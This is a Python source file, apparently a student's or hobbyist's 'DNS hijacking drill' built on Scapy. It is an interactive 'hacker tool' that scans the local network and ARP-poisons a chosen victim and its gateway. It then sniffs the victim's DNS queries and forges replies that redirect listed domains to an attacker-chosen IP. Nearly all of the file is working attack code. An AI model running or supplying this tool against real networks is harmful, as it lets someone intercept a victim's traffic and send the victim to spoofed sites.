# DNS劫持演练
from scapy.all import *
import os
import time
from threading import Thread
import sys

# 定义变量和函数
wg=''
oldname=''
wifi='Intel(R) Dual Band Wireless-AC 3168'
blacklist=['www.topsec.com', 'www.sina.com']


# 扫描局域网，显示活跃主机
def scan():
    global wg
    # 之所以用'route print'的结果来获取本机IP和网关IP，是因为'本机IP和网关IP'所在行有明显的特征
    for line in os.popen('route print'):
        s=line.strip()
        if s.startswith('0.0.0.0'):
            slist=s.split()
            ip=slist[3]  # 获取本机IP
            wg=slist[2]  # 获取网关IP
            break
    print("本机上网的IP:", ip)
    print("本机上网的网关:", wg)
    tnet=wg + "/24"  # tnet代表本网段

    # 扫描同一网段下的活跃主机，并按从大到小的顺序打印ip和mac
    # 给同一网段的所有主机发送ARP广播。如果主机活跃则会有应答(ans)
    p=Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=tnet)
    ans, unans=srp(p, iface=wifi, timeout=2, verbose=0)
    # 根据应答(ans)的长度来确定活跃的主机
    print("一共扫描到%d台主机：" % len(ans))
    result=[]
    for s, r in ans:
        # 从应答包(ans)中获取活跃主机的IP和相应的MAC地址，并存在列表result中
        result.append([r[ARP].psrc, r[ARP].hwsrc])
    result.sort()
    for ip, mac in result:
        print(ip, "--->", mac)


# 嗅探目标主机的DNS请求
def capture(target, t):
    tj="udp dst port 53 and host " + target
    pkts=sniff(iface=wifi, filter=tj, prn=dnsposion, timeout=t)


# ARP攻击
def spoof():
    vic=input("请输入攻击目标:")
    t=int(input("请输入攻击时间(单位：秒):"))
    # 开启多线程，对目标主机的DNS请求进行抓包(ARP攻击之后，目标主机的上网请求都会经过我)
    ct=Thread(target=capture, args=(vic, t))
    ct.start()
    # 每隔0.2秒给目标主机发送一次攻击，总共发5*int(t)次
    for i in range(5 * int(t)):
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=vic, psrc=wg), verbose=0)
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=wg, psrc=vic), verbose=0)
        time.sleep(0.2)
    ct.join()
    print("攻击结束！")


def dnsposion(p):
    global oldname  # 将oldname定义成全局变量
    vmip=sys.argv[1]  # 获取命令行的参数，即Windows Server 2008的IP
    try:
        # 在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行
        if p.haslayer(DNS):
            ip=p[IP]
            udp=p[UDP]
            dns=p[DNS]
            qname=dns.qd.qname.decode()[:-1]  # 获取请求的域名

            # 对于之前出现过的请求不再显示
            if qname != oldname:
                print('收到一个请求', qname)

            # 如果解析的域名在我的黑名单中，则构造一个包含我搭建的网站IP的DNS响应包发给目标主机
            if qname in blacklist:
                nip=IP(src=ip.dst, dst=ip.src)
                nudp=UDP(sport=udp.dport, dport=udp.sport)
                ndns=DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, rdata=vmip))
                send(nip / nudp / ndns, iface=wifi)
                print('%s--->' % qname, vmip)
    except:
        pass


def main():
    print("欢迎使用我的黑客工具!")
    while 1:
        sel=input("请选择要进行的操作：1、局域网扫描 2、DNS劫持 3、流量分析 4、退出\t")
        if sel == '1':
            scan()
        elif sel == '2':
            if not wg:
                print("请先执行扫描程序！")
            else:
                spoof()
        elif sel == '3':
            print("开发中... ...")
            pass
        elif sel == '4':
            print("欢迎下次使用，再见！")
            break
        else:
            print("输入有误，请重新输入！")


if __name__ == "__main__":
    main()